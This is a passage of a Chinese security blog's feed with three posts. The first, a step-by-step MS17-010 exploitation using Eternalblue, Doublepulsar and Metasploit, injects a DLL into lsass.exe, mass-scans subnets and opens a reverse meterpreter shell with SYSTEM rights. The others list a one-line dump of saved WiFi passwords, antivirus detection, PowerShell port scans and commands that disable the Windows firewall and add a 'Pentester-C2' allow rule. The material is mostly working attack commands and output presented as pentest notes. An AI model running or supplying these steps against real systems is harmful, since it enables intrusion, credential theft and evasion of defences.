class="line">[?] Destination IP [192.168.1.25] :</div><div class="line">[?] Destination Port [445] :</div><div class="line">[+] (TCP) Local 192.168.1.25:445</div><div class="line"></div><div class="line">[+] Configure Plugin Remote Tunnels</div><div class="line"></div><div class="line"></div><div class="line">Module: Doublepulsar</div><div class="line">====================</div><div class="line"></div><div class="line">Name                  Value</div><div class="line">----                  -----</div><div class="line">NetworkTimeout        60</div><div class="line">TargetIp              192.168.1.25</div><div class="line">TargetPort            445</div><div class="line">DllPayload            E:\test.dll</div><div class="line">DllOrdinal            1</div><div class="line">ProcessName           lsass.exe</div><div class="line">ProcessCommandLine</div><div class="line">Protocol              SMB</div><div class="line">Architecture          x64</div><div class="line">Function              RunDLL</div><div class="line"></div><div class="line">[?] Execute Plugin? [Yes] :</div><div class="line">[*] Executing Plugin</div><div class="line">[+] Selected Protocol SMB</div><div class="line">[.] Connecting to target...</div><div class="line">[+] Connected to target, pinging backdoor...</div><div class="line">        [+] Backdoor returned code: 10 - Success!</div><div class="line">        [+] Ping returned Target architecture: x64 (64-bit) - XOR Key: 0x6CDC31C</div><div class="line">9</div><div class="line">    SMB Connection string is: Windows 7 Professional 7600</div><div class="line">    Target OS is: 7 x64</div><div class="line">    Target SP is: 0</div><div class="line">        [+] Backdoor installed</div><div class="line">        [+] DLL built</div><div class="line">        [.] Sending shellcode to inject DLL</div><div class="line">        [+] Backdoor returned code: 10 - Success!</div><div class="line">        [+] Backdoor returned code: 10 - Success!</div><div class="line">        [+] Backdoor returned code: 10 - Success!</div><div class="line">        [+] Command completed successfully</div><div class="line">[+] Doublepulsar Succeeded</div></pre></td></tr></table></figure>
<h3 id="反弹shell成功。"><a href="#反弹shell成功。" class="headerlink" title="反弹shell成功。"></a>反弹shell成功。</h3><p><img src="http://i2.muimg.com/567571/cc1d05bb4f072b13.png" alt=""></p>
<h2 id="SMB漏洞批量检测"><a href="#SMB漏洞批量检测" class="headerlink" title="SMB漏洞批量检测"></a>SMB漏洞批量检测</h2><h3 id="扫描脚本的下载和加载"><a href="#扫描脚本的下载和加载" class="headerlink" title="扫描脚本的下载和加载"></a>扫描脚本的下载和加载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb</div><div class="line">root@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb# wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb</div></pre></td></tr></table></figure>
<p><img src="http://i4.buimg.com/4851/2098d5052ed449b4.png" alt=""></p>
<h3 id="漏洞扫描的使用方法"><a href="#漏洞扫描的使用方法" class="headerlink" title="漏洞扫描的使用方法"></a>漏洞扫描的使用方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/scanner/smb/smb_ms_17_010</div><div class="line">msf auxiliary(smb_ms_17_010) &gt; set RHOSTS 192.168.2.1-255</div><div class="line">RHOSTS =&gt; 192.168.2.1-255</div><div class="line">msf auxiliary(smb_ms_17_010) &gt; set THREADS 10</div><div class="line">THREADS =&gt; 10</div><div class="line">msf auxiliary(smb_ms_17_010) &gt; run</div><div class="line">[*] Scanned  27 of 255 hosts (10% complete)</div><div class="line">[*] Scanned  51 of 255 hosts (20% complete)</div><div class="line">[*] Scanned  77 of 255 hosts (30% complete)</div><div class="line">[*] 192.168.2.103:445     - Connected to \\192.168.2.103\IPC$ with TID = 2048</div><div class="line">[*] 192.168.2.103:445     - Received STATUS_INSUFF_SERVER_RESOURCES with FID = 0</div><div class="line">[!] 192.168.2.103:445     - Host is likely VULNERABLE to MS17-010!</div><div class="line">[*] Scanned 103 of 255 hosts (40% complete)</div><div class="line">[*] Scanned 131 of 255 hosts (51% complete)</div><div class="line">[*] Scanned 153 of 255 hosts (60% complete)</div><div class="line">[*] Scanned 179 of 255 hosts (70% complete)</div><div class="line">[*] Scanned 205 of 255 hosts (80% complete)</div><div class="line">[*] Scanned 230 of 255 hosts (90% complete)</div><div class="line">[*] Scanned 255 of 255 hosts (100% complete)</div><div class="line">[*] Auxiliary module execution completed</div><div class="line">msf auxiliary(smb_ms_17_010) &gt;</div></pre></td></tr></table></figure>
<p>将得到的结果进行验证</p>
<p>如果不想使用上面的方法进行验证，那也可以使用MSF直接验证</p>
<h3 id="smb命令执行msf利用过程"><a href="#smb命令执行msf利用过程" class="headerlink" title="smb命令执行msf利用过程"></a>smb命令执行msf利用过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/windows/smb/ms17-010 </div><div class="line">msf exploit(ms17-010) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(ms17-010) &gt; set rhost 192.168.2.103</div><div class="line">rhost =&gt; 192.168.2.103</div><div class="line">msf exploit(ms17-010) &gt; set lhost 192.168.2.105</div><div class="line">lhost =&gt; 192.168.2.105</div><div class="line">msf exploit(ms17-010) &gt; show options</div><div class="line">Module options (exploit/windows/smb/ms17-010):</div><div class="line">   Name                Current Setting                                                      Required  Description</div><div class="line">   ----                ---------------                                                      --------  -----------</div><div class="line">   DOUBLEPULSARPATH    //usr/share/metasploit-framework/modules/exploits/windows/smb/deps   yes       Path directory of Doublepulsar</div><div class="line">   ETERNALBLUEPATH     //usr/share/metasploit-framework/modules/exploits/windows/smb/deps/  yes       Path directory of Eternalblue</div><div class="line">   PROCESSINJECT       lsass.exe                                                            yes       Name of process to inject into (Change to lsass.exe for x64)</div><div class="line">   RHOST               192.168.2.103                                                        yes       The target address</div><div class="line">   RPORT               445                                                                  yes       The SMB service port (TCP)</div><div class="line">   TARGETARCHITECTURE  x86                                                                  yes       Target Architecture (Accepted: x86, x64)</div><div class="line">   WINEPATH            /root/.wine/drive_c/                                                 yes       WINE drive_c path</div><div class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</div><div class="line">   LHOST     192.168.2.105    yes       The listen address</div><div class="line">   LPORT     4444             yes       The listen port</div><div class="line">Exploit target:</div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   8   Windows Server 2008 R2 (x86) (x64)</div><div class="line">msf exploit(ms17-010) &gt; set TARGETARCHITECTURE x64</div><div class="line">TARGETARCHITECTURE =&gt; x64</div><div class="line">msf exploit(ms17-010) &gt; show targets</div><div class="line">Exploit targets:</div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line">   1   Windows XP (all services pack) (x86) (x64)</div><div class="line">   2   Windows Server 2003 SP0 (x86)</div><div class="line">   3   Windows Server 2003 SP1/SP2 (x86)</div><div class="line">   4   Windows Server 2003 (x64)</div><div class="line">   5   Windows Vista (x86)</div><div class="line">   6   Windows Vista (x64)</div><div class="line">   7   Windows Server 2008 (x86) </div><div class="line">   8   Windows Server 2008 R2 (x86) (x64)</div><div class="line">   9   Windows 7 (all services pack) (x86) (x64)</div><div class="line">msf exploit(ms17-010) &gt; set targets 9</div><div class="line">targets =&gt; 9</div><div class="line">msf exploit(ms17-010) &gt; exploit </div><div class="line">[*] Started reverse TCP handler on 192.168.2.105:4444 </div><div class="line">[*] 192.168.2.103:445 - Generating Eternalblue XML data</div><div class="line">[*] 192.168.2.103:445 - Generating Doublepulsar XML data</div><div class="line">[*] 192.168.2.103:445 - Generating payload DLL for Doublepulsar</div><div class="line">[*] 192.168.2.103:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll</div><div class="line">[*] 192.168.2.103:445 - Launching Eternalblue...</div><div class="line">[+] 192.168.2.103:445 - Backdoor is already installed</div><div class="line">[*] 192.168.2.103:445 - Launching Doublepulsar...</div><div class="line">[*] Sending stage (1189423 bytes) to 192.168.2.103</div><div class="line">[*] Meterpreter session 1 opened (192.168.2.105:4444 -&gt; 192.168.2.103:62662) at 2017-04-29 15:43:03 +0800</div><div class="line">[+] 192.168.2.103:445 - Remote code executed... 3... 2... 1...</div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: NT AUTHORITY\SYSTEM</div><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : RCOIL-PC</div><div class="line">OS              : Windows 7 (Build 7600).</div><div class="line">Architecture    : x64</div><div class="line">System Language : zh_CN</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 1</div><div class="line">Meterpreter     : x64/windows</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<p>参考：<a href="https://www.diazsecurity.com/2017/04/explotando-cve-2017-010-eternalblue-doublepulsar-metasploit/" target="_blank" rel="external">Explotando CVE-2017-010 con Eternalblue y Doublepulsar desde Metasploit</a></p>
<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p><a href="http://www.freebuf.com/?s=NSA" target="_blank" rel="external">http://www.freebuf.com/?s=NSA</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在4月14日下午5点shadowbroker公布了去年从方程式组织窃取的工具包&lt;/p&gt;
&lt;p&gt;本次被公开的工具包大小为117.9MB，包含23个黑客工具。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="shadowbroker" scheme="http://rcoil.me/tags/shadowbroker/"/>
    
      <category term="系统安全" scheme="http://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>小技巧</title>
    <link href="http://rcoil.me/2017/04/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://rcoil.me/2017/04/小技巧/</id>
    <published>2017-04-12T14:26:41.000Z</published>
    <updated>2017-08-13T06:05:05.078Z</updated>
    
    <content type="html"><![CDATA[<p>一些平时用到的小技巧，权当是一些笔记<br><a id="more"></a></p>
<h3 id="cmd一键获取所有连接过的wifi-密码"><a href="#cmd一键获取所有连接过的wifi-密码" class="headerlink" title="cmd一键获取所有连接过的wifi 密码"></a>cmd一键获取所有连接过的wifi 密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</div><div class="line">pause</div></pre></td></tr></table></figure>
<h3 id="SSH命令行上传-下载文件"><a href="#SSH命令行上传-下载文件" class="headerlink" title="SSH命令行上传/下载文件"></a>SSH命令行上传/下载文件</h3><p>上传：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">scp /path/file（这部分为本地的路径） user（远端目标用户名）@host（远端目标IP）:/pathorfile（文件存储路径）</div><div class="line">例如 ：</div><div class="line">scp /root/Desktop/demo.php root@192.168.40.111:/var/www/html/</div></pre></td></tr></table></figure></p>
<p>下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">scp user（远端用户名）@host（远端IP）:/path/file（下载文件在远端的路径） localpathorfile（本地文件存放路径）</div><div class="line">例如 ：scp root@192.168.40.111:/var/www/html/demo.zip /root/</div></pre></td></tr></table></figure></p>
<p>查看目录或文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh user@host command ls &quot;/path/*.tgz&quot;</div></pre></td></tr></table></figure></p>
<h3 id="判断系统安装杀软情况"><a href="#判断系统安装杀软情况" class="headerlink" title="判断系统安装杀软情况"></a>判断系统安装杀软情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *</div></pre></td></tr></table></figure>
<h3 id="判断-net版本"><a href="#判断-net版本" class="headerlink" title="判断.net版本"></a>判断.net版本</h3><p>```<br>reg query “HKLM\Software\Microsoft\NET Framework Setup\NDP” /s /v version | findstr /i version | sort /+26 /r</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些平时用到的小技巧，权当是一些笔记&lt;br&gt;
    
    </summary>
    
      <category term="feeling" scheme="http://rcoil.me/categories/feeling/"/>
    
    
      <category term="feeling" scheme="http://rcoil.me/tags/feeling/"/>
    
  </entry>
  
  <entry>
    <title>PowerShell简单使用</title>
    <link href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://rcoil.me/2017/04/PowerShell简单使用/</id>
    <published>2017-04-05T05:19:23.000Z</published>
    <updated>2017-08-01T15:56:44.437Z</updated>
    
    <content type="html"><![CDATA[<p>总结一些PowerShell的简单操作<br><a id="more"></a></p>
<h2 id="ping扫描"><a href="#ping扫描" class="headerlink" title="ping扫描"></a>ping扫描</h2><p><img src="http://i1.piimg.com/567571/1dbaf67987d7f019.png" alt=""><br>在横向pentest的时候，在nmap之类的工具使用不了，而PowerShell作为Windows的固有组件,用起来更加高效，而且能更加隐蔽的运行。</p>
<h3 id="ping扫描-1"><a href="#ping扫描-1" class="headerlink" title="ping扫描"></a>ping扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1..255 | % &#123;echo &quot;192.168.1.$_&quot;; ping -n 1 -w 100 192.168.1.$_&#125; | Select-String ttl</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i4.buimg.com/567571/7366d28898a23d07.png" alt=""><br>此命令按顺序ping循环中的每个IP地址。并且过滤掉没有响应的IP，使用Select-String查找并只显示包含文本“TTL”的行。</p>
<h4 id="命令分解"><a href="#命令分解" class="headerlink" title="命令分解"></a>命令分解</h4><p><code>1..255 | % {echo &quot;192.168.1.$_&quot;; ping -n 1 -w 100 192.168.1.$_} | Select-String ttl</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.255  - 产生从1到255的数字列表</div><div class="line">|  - 将每个数字作为对象传递到循环中</div><div class="line">％ -  PowerShell中的％运算符是foreach对象的别名，用于启动循环。依次循环执行&#123;&#125;之间的内容</div><div class="line">echo &quot;192.168.1.$_&quot;; - 打印出IP地址。$_是一个意味着当前对象的变量。当前对象与循环当前所在的数字（1..255）相关。</div><div class="line">ping  - 两个节点之间的ICMP连接的Packet Internet groper实用程序测试。</div><div class="line">-n 1  - 发送手动设置的次数在1之后停止</div><div class="line">-w 100  - 超时前等待的毫秒数。这可能需要根据目标环境的延迟进行调整</div><div class="line">192.168.1.$_  - 要ping的IP地址</div><div class="line">| Select-String ttl  - 将循环中的所有输出管道输入到Select-String中。过滤所有没有ttl的行。</div></pre></td></tr></table></figure>
<h3 id="command-metrics"><a href="#command-metrics" class="headerlink" title="command metrics"></a>command metrics</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Measure-Command &#123;&#125;</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i1.piimg.com/567571/683e296b84de5036.png" alt=""><br>通过演示并行执行，ping扫描能够枚举网络增加的速率。虽然限于4个并行线程，我们实现了比单线程快62％的结果。产生额外的线程可能会增加枚举速度甚至更高。</p>
<h3 id="整段扫描"><a href="#整段扫描" class="headerlink" title="整段扫描"></a>整段扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">workflow ParallelSweep &#123; foreach -parallel -throttlelimit 4 ($i in 1..255) &#123;ping -n 1 -w 100 192.168.1.$i&#125;&#125;; ParallelSweep | Select-String ttl</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i1.piimg.com/567571/3b8ae802047623cb.png" alt=""></p>
<h4 id="命令分解-1"><a href="#命令分解-1" class="headerlink" title="命令分解"></a>命令分解</h4><p><code>workflow ParallelSweep { foreach -parallel -throttlelimit 4 ($i in 1..255) {ping -n 1 -w 100 192.168.1.$i}}; ParallelSweep | Select-String ttl</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">workflow ParallelSweep &#123;&#125; - 声明一个名为Parallel-Sweep的工作流程</div><div class="line">foreach  - 开始循环</div><div class="line">-parallel - 并行执行循环</div><div class="line">-throttlelimit 4 - 将并发线程数限制为4</div><div class="line">($i in 1..255) - 运行循环1到255次</div><div class="line">ping -n 1 -w 100 192.168.1.$i  -  Ping IP地址</div><div class="line">ParallelSweep - 调用工作流ParallelSweep</div><div class="line">| Select-String ttl  - 过滤Parallel-Sweep的输出。只打印有包含“ttl”的行</div></pre></td></tr></table></figure></p>
<h3 id="系统类型检测"><a href="#系统类型检测" class="headerlink" title="系统类型检测"></a>系统类型检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0..192 | % &#123; $a = $_; 1..255 | % &#123; $b = $_; ping -n 1 -w 10 &quot;192.168.$a.$b&quot; | select-string TTL | % &#123; if ($_ -match &quot;ms&quot;) &#123; $ttl = $_.line.split(&apos;=&apos;)[2] -as [int]; if ($ttl -lt 65) &#123; $os = &quot;Linux&quot; &#125; ElseIf ($ttl -gt 64 -And $ttl -lt 129) &#123; $os = &quot;Windows&quot; &#125; else &#123; $os = &quot;Cisco&quot;&#125;; write-host &quot;192.168.$a.$b OS: $os&quot;; echo &quot;192.168.$a.$b&quot; &gt;&gt; scan_results.txt &#125;&#125;&#125; &#125;</div></pre></td></tr></table></figure>
<p>使用一个多子网扫描器来构建一个可访问主机的报告,甚至可以通过评估TTL值来辅助攻击目标，来辨识非常基本的操作系统指纹。<br>demo:<br><img src="http://i4.buimg.com/567571/90bad5412f7e9aef.png" alt=""></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结**"></a>小结<em>**</em></h3><p>这些简单的脚本有很多方法来扩展，只有这样，才能在开创网络之后才能收集更多所需要的有关网络信息。这些技术在一定场景中对目标识别的过程中特别有用。</p>
<h2 id="添加防火墙规则"><a href="#添加防火墙规则" class="headerlink" title="添加防火墙规则"></a>添加防火墙规则</h2><p><img src="http://i2.muimg.com/567571/b86c9c46e147bfb1.png" alt=""><br>平时在本地搭建的环境和培训环境当中，防火墙都是被禁用的，这样可以促进学习体验。然而，作为pentest的一部分，绕过和操纵防火墙正是一天的工作内容。Windows防火墙是当今遇到的最常见的数据包过滤障碍。虽然它不一定是最强大的解决方案，但是在不直接访问GUI的情况下操作可能是最棘手的。幸运的是，PowerShell支持一套强大的集成功能，可以利用它。</p>
<h3 id="禁用-启用Windows防火墙"><a href="#禁用-启用Windows防火墙" class="headerlink" title="禁用/启用Windows防火墙"></a>禁用/启用Windows防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False</div><div class="line">Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True</div></pre></td></tr></table></figure>
<h3 id="添加允许特定IP地址连接"><a href="#添加允许特定IP地址连接" class="headerlink" title="添加允许特定IP地址连接"></a>添加允许特定IP地址连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress 192.168.1.100</div></pre></td></tr></table></figure>
<h4 id="命令分解-2"><a href="#命令分解-2" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">New-NetFirewallRule  - 用于创建新的防火墙规则的PowerShell cmdlet</div><div class="line">-Action - 禁止或允许。默认是允许</div><div class="line">-DisplayName Pentester-C2  - 在GUI中或通过命令行查看规则的名称</div><div class="line">-RemoteAddress 192.168.1.100  - 允许入站连接的地址</div></pre></td></tr></table></figure>
<h3 id="允许特定端口的连接"><a href="#允许特定端口的连接" class="headerlink" title="允许特定端口的连接"></a>允许特定端口的连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">new-netfirewallrule -action allow -localport 80 -direction inbound -protocol tcp -displayname pentester-c2</div></pre></td></tr></table></figure>
<h4 id="命令分解-3"><a href="#命令分解-3" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-localport 80  - 应用规则的本地端口</div><div class="line">-direction inbound - 将规则应用到的方向。这是入站或出站</div><div class="line">-protocol tcp - 指定TCP / UDP端口时，用户还必须指定应用规则的两个协议中的哪一个。该值也可以是协议号0-255或另一个协议名称（例如：ICMPv4）。</div></pre></td></tr></table></figure>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="http://i1.piimg.com/567571/8379c0642ef05d66.png" alt=""><br>在平时的pentest中，nmap是端口扫描的最佳选择，但有时候可能不是一个最佳的选择。来看一下使用PowerShell进行基本端口扫描功能的方法。<br>要在一行中创建PowerShell端口扫描器，我们需要组合三个不同的组件。创建一系列对象，循环遍历每个对象，并将每个对象的信息输出到屏幕。</p>
<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.7&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i4.buimg.com/567571/4740cdad0ba08144.png" alt=""></p>
<h4 id="命令分解-4"><a href="#命令分解-4" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1..1024  - 创建1..1024之间的变量范围</div><div class="line">|  - 管道操作员将对象传递到循环中</div><div class="line">％ -  PowerShell中的％运算符是foreach对象的别名，用于启动循环。循环依次执行&#123;&#125;之间的内容</div><div class="line">echo  - 将以下输出打印到屏幕上</div><div class="line">new-object Net.Sockets.TcpClient  - Net.Sockets TcpClient类的一个实例，允许我们将socket连接到TCP端口</div><div class="line">Connect（“192.168.1.7”，$_）） - 调用TcpClient类上的Connect函数，参数为192.168.1.7和port $_。$ _是一个意味着当前对象的变量。当前对象与循环当前所在的数字（1..1024）相关。</div><div class="line">“Port $_ is open！”） - 打印Port＃已打开！当程序找到一个打开的端口。</div><div class="line">2&gt; $ null  - 这告诉PowerShell不显示遇到的任何错误</div></pre></td></tr></table></figure>
<h3 id="扫描单个端口的IP范围"><a href="#扫描单个端口的IP范围" class="headerlink" title="扫描单个端口的IP范围"></a>扫描单个端口的IP范围</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foreach ($ip in 1..20) &#123;Test-NetConnection -Port 80 -InformationLevel &quot;Detailed&quot; 192.168.1.$ip&#125;</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i4.buimg.com/567571/5f90e854984578ca.png" alt=""></p>
<h4 id="命令分解-5"><a href="#命令分解-5" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">foreach（$ ip in 1..20）&#123;&#125;  - 循环数字1到20</div><div class="line">Test-NetConnection  -  Test-NetConnection是一种用于测试不同类型网络连接的实用程序。</div><div class="line">-Port 80 - 检查80端口的可用性</div><div class="line">-InformationLevel &quot;Detailed&quot; - 提供详细的输出信息</div><div class="line">192.168.1.$ip  - 尝试根据列出的IP地址连接到端口80。在这个例子中，$ip变量从1-20循环。</div></pre></td></tr></table></figure>
<p>构建扫描仪遍历系统和端口也是可行的</p>
<h3 id="自定义IP范围和端口范围"><a href="#自定义IP范围和端口范围" class="headerlink" title="自定义IP范围和端口范围"></a>自定义IP范围和端口范围</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1..20 | % &#123; $a = $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i2.muimg.com/567571/57e51a87839e5c9c.png" alt=""><br>此版本的命令将扫描的IP地址192.168.1.1-20和ports 1-1024。请注意，可能需要一段时间才能完成。更有效的替代方法可能是指定要手动查找的端口。喜欢这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1..20 | % &#123; $a = $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;</div></pre></td></tr></table></figure></p>
<h3 id="测试出口过滤"><a href="#测试出口过滤" class="headerlink" title="测试出口过滤"></a>测试出口过滤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;allports.exposed&quot;,$_)) &quot;Port $_ is open!&quot; &#125; 2&gt;$null</div></pre></td></tr></table></figure>
<h2 id="获取防火墙规则"><a href="#获取防火墙规则" class="headerlink" title="获取防火墙规则"></a>获取防火墙规则</h2><h3 id="获取防火墙规则-1"><a href="#获取防火墙规则-1" class="headerlink" title="获取防火墙规则"></a>获取防火墙规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-NetFirewallRule -all</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i2.muimg.com/567571/b4911fe6cbb4805e.png" alt=""></p>
<h3 id="获取防火墙的名称列表"><a href="#获取防火墙的名称列表" class="headerlink" title="获取防火墙的名称列表"></a>获取防火墙的名称列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-NetFirewallRule -all | Format-List -Property Name</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i1.piimg.com/567571/8f0edd5ec4f27338.png" alt=""></p>
<h3 id="获取防火墙的视图界面"><a href="#获取防火墙的视图界面" class="headerlink" title="获取防火墙的视图界面"></a>获取防火墙的视图界面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-NetFirewallRule -all | Out-GridView</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i4.buimg.com/567571/514f0b98a8cb8952.png" alt=""></p>
